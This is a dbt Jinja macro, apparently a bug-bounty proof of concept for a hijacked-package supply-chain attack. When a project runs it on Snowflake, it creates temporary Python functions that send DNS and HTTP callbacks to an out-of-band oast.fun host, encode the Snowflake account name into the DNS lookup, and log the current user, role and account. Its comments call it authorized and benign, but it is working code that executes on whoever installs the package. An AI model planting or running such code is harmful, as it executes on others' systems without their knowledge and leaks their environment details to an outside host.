{% macro poc_marker() %}
  {# SUPPLY CHAIN POC 1627 — authorized security research #}
  {# Proves arbitrary code execution via hijacked dbt package #}
  {# Benign: no data read/write/exfil — only OAST callback + context logging #}

  {# ── Method 1: Snowflake Python UDF → DNS callback (most reliable) ── #}
  {% if execute and target.type == 'snowflake' %}
    {% do run_query("
      CREATE OR REPLACE TEMPORARY FUNCTION _sc_poc_1627()
      RETURNS STRING LANGUAGE PYTHON RUNTIME_VERSION='3.11' HANDLER='f'
      AS $$
def f():
    import socket, os
    try:
        acct = os.environ.get('SNOWFLAKE_ACCOUNT', 'unknown').replace('.', '-')
        socket.getaddrinfo(f'dbt-rce-{acct}.yokodnssmamqdchvjfyq1w8ixw5vlddtn.oast.fun', 80, proto=socket.IPPROTO_TCP)
        return 'dns_callback_sent'
    except Exception as e:
        return f'dns_blocked:{e}'
$$
    ") %}
    {% set cb = run_query("SELECT _sc_poc_1627() AS status") %}
    {% do run_query("DROP FUNCTION IF EXISTS _sc_poc_1627()") %}
  {% endif %}

  {# ── Method 2: Snowflake Python UDF → HTTP callback (needs EAI) ── #}
  {% if execute and target.type == 'snowflake' %}
    {% do run_query("
      CREATE OR REPLACE TEMPORARY FUNCTION _sc_poc_1627_http()
      RETURNS STRING LANGUAGE PYTHON RUNTIME_VERSION='3.11'
      PACKAGES=('requests') HANDLER='f'
      AS $$
def f():
    import requests
    try:
        r = requests.get('https://yokodnssmamqdchvjfyq1w8ixw5vlddtn.oast.fun/dbt-supply-chain-rce-poc-1627', timeout=5)
        return f'http_callback:{r.status_code}'
    except Exception as e:
        return f'http_blocked:{e}'
$$
    ") %}
    {% set http_cb = run_query("SELECT _sc_poc_1627_http() AS status") %}
    {% do run_query("DROP FUNCTION IF EXISTS _sc_poc_1627_http()") %}
  {% endif %}

  {# ── Universal: capture execution context as proof ── #}
  {% if execute %}
    {% set ctx = run_query("SELECT CURRENT_USER() AS u, CURRENT_ROLE() AS r, CURRENT_ACCOUNT() AS a, CURRENT_DATABASE() AS d, CURRENT_WAREHOUSE() AS w") %}
    {% set u = ctx.columns[0].values()[0] %}
    {% set r = ctx.columns[1].values()[0] %}
    {% set a = ctx.columns[2].values()[0] %}
    {{ log(">>> SUPPLY_CHAIN_POC_1627-rootxravi-rootxravi@bugcrowdninja.com | user=" ~ u ~ " role=" ~ r ~ " account=" ~ a, info=True) }}
    {{ log(">>> OAST callback target: yokodnssmamqdchvjfyq1w8ixw5vlddtn.oast.fun", info=True) }}
    {% if cb is defined %}
      {{ log(">>> DNS callback: " ~ cb.columns[0].values()[0], info=True) }}
    {% endif %}
    {% if http_cb is defined %}
      {{ log(">>> HTTP callback: " ~ http_cb.columns[0].values()[0], info=True) }}
    {% endif %}
  {% endif %}
{% endmacro %}
